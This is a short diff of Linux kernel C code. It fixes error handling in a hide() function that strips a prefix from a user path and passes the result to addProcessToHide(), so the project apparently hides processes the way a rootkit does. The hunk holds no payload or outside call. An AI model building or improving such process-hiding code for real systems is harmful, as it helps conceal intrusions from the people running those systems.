@@ -39,9 +39,10 @@ int hide(const char __user *path) {
     return -ENOMEM;
   }
   result = strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
-  if (result) {
+  if (result < 0) {
     kfree(_path);
     kfree(tempPath);
+    return result;
   }
   //      printk("%s",tempPath);
   result = addProcessToHide(tempPath);
